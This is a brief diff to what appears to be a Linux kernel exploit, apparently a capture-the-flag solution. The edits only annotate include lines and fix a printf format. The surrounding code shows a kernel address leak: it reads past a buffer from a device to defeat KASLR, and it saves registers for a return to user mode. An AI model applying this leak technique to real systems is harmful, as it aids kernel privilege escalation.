@@ -1,8 +1,8 @@
-#include <fcntl.h>
-#include <stdint.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
+#include <fcntl.h>   // for open, O_RDWR
+#include <stdint.h>  // for uintptr_t, uint8_t
+#include <stdio.h>   // for NULL, perror, printf, puts
+#include <stdlib.h>  // for EXIT_FAILURE, EXIT_SUCCESS
+#include <unistd.h>  // for close, execve, read, write
 
 uintptr_t cs;
 uintptr_t rflags;
@@ -44,7 +44,7 @@ static void leak_offset(int fd, uint8_t *data)
 	read(fd, data, 0x410);
 	ptr = *(uintptr_t *)&data[0x408];
 	offset = ptr - 0xffffffff8113d33c;
-	printf("[+] offset: %#x\n", offset);
+	printf("[+] offset: %#lx\n", offset);
 }
 
 int main(void)
